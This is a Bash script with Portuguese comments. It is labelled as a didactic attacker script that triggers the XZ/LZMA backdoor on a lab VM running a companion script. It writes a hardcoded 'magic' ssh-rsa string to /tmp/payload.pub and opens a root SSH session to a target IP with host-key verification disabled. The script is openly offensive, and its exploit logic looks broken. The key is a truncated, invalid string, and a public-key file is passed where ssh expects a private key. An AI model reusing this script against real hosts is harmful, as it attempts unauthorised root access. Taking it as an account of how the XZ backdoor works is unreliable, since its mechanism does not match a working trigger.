#!/usr/bin/env bash
# XZ/LZMA backdoor exploit trigger - Attacker Script
# Autor: Gabryel-lima (versão didática)

set -euo pipefail

# Configurações
PAYLOAD_PUB="/tmp/payload.pub"
MAGIC_KEY="ssh-rsa AAAAE2VjZS5waHA6Ly8vanVzdC1hLXRlc3QtY2Fsb"

# Cores
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

usage() {
    echo "Uso: $0 <IP_DO_ALVO> [PORTA]"
    echo "Exemplo: $0 192.168.1.10 2222"
    exit 1
}

if [[ $# -lt 1 ]]; then
    usage
fi

TARGET_IP=$1
PORT=${2:-2222}

echo -e "${GREEN}[*] Gerando arquivo de chave maliciosa em $PAYLOAD_PUB...${NC}"
echo "$MAGIC_KEY" > "$PAYLOAD_PUB"
chmod 600 "$PAYLOAD_PUB"

echo -e "${GREEN}[*] Tentando conexão contra $TARGET_IP na porta $PORT...${NC}"
echo -e "${RED}[!] Certifique-se que o alvo está rodando o script xzdoor.sh (Opção 8).${NC}"

# Executa o SSH com a chave mágica e timeout para evitar espera infinita
ssh -p "$PORT" \
    -o "PubkeyAuthentication=yes" \
    -o "StrictHostKeyChecking=no" \
    -o "UserKnownHostsFile=/dev/null" \
    -o "ConnectTimeout=5" \
    -i "$PAYLOAD_PUB" "root@$TARGET_IP" || {
    echo -e "\n${RED}[-] Erro: A conexão falhou.${NC}"
    echo "Dicas:"
    echo "1. Verifique se o IP $TARGET_IP está correto."
    echo "2. O SSH na VM alvo deve refletir '[INFO] Iniciando SSH manual na porta 2222'."
    echo "3. Verifique se o firewall (UFW) na VM alvo permitiu a porta $PORT."
}
